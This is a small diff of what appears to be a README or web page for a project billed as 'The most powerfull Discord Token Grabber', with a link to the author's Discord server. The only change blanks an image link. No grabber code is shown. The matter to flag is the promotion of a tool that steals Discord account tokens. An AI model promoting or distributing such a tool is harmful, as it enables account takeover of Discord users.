@@ -3,7 +3,7 @@
   <p>The most powerfull Discord Token Grabber</p>
   <a href="https://guns.lol/seo" target="_blank">Join my Discord Serveur</a><br><br>
 
-  <img src="https://guns.lol/seo" style="width: 600px; height: 400px;">
+  <img src="" style="width: 600px; height: 400px;">
 </div>
 
 <br><br><br>
